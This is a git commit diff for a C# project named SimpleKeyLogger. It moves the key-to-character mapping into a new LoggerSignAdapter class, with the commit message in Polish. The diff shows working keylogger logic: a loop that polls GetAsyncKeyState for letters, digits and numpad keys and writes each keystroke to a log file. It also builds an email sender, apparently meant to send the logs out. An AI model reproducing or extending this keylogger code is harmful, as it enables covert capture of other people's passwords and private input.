ac4ba947ce1414e6f9a4eeec85e82466fad5140e
joannakrol <joannakrol942@gmail.com>
2022-12-05 20:34:01 +0100

    Refaktor wyznaczania znaków - wyniesienie do klasy LoggerSignAdapter

--- Program.cs
+++ Program.cs
@@ -2,6 +2,7 @@
 using SimpleKeyLogger.EmailSender;
 using SimpleKeyLogger.FileAdapters;
 using SimpleKeyLogger.Models;
+using SimpleKeyLogger.SignAdapter;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -25,37 +26,25 @@ namespace SimpleKeyLogger
             AppConfig config = JsonConvert.DeserializeObject<AppConfig>(configText);
             LoggerEmailSender sender = new LoggerEmailSender(config);
             TextFileAdapter file = new TextFileAdapter("log", "");
-            
-            List<int> charSet = new List<int>();
-            for (int i = 48; i <= 57; i++) charSet.Add(i);
-            for (int i = 65; i <= 90; i++) charSet.Add(i);
-            for (int i = 96; i <= 105; i++) charSet.Add(i);
-            charSet.Add(32);
-            charSet.Add(13);
-            charSet.Add(27);
+
+            LoggerSignAdapter loggerSignAdapter = new LoggerSignAdapter();
 
             while (true)
             {
                 Thread.Sleep(10);
 
-                foreach (int i in charSet)
+                foreach (int i in loggerSignAdapter.charSet)
                 {
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 1 || keyState == 32769)
                     {
-                        if (i >= 96 && i <= 105)
-                        {
-                            file.WriteToFile((char)(i - 48));
-                        }
-                        else if (i == 27)
+                       
+                        if (i == 27)
                         {
                             endOfProgram = true;
                         }
-                        else
-                        {
-                            file.WriteToFile((char)i);
-                        }
-
+                        file.WriteToFile(loggerSignAdapter.GetSign(i));
+                       
                         numberOfKey++;
                         break;
                     }
---
+++ SignAdapter/LoggerSignAdapter.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SimpleKeyLogger.SignAdapter
+{
+    public class LoggerSignAdapter
+    {
+        public readonly List<int> charSet;
+
+        public LoggerSignAdapter()
+        {
+            charSet = new List<int>();
+            for (int i = 48; i <= 57; i++) charSet.Add(i);
+            for (int i = 65; i <= 90; i++) charSet.Add(i);
+            for (int i = 96; i <= 105; i++) charSet.Add(i);
+            charSet.Add(32);
+            charSet.Add(13);
+            charSet.Add(27);
+        }
+        public char GetSign (int signInt)
+        {
+            
+            if (signInt >= 96 && signInt <= 105)
+            {
+                return (char)(signInt - 48);
+            }
+            else
+            {
+               return (char)signInt;
+            }
+        }
+    }
+}
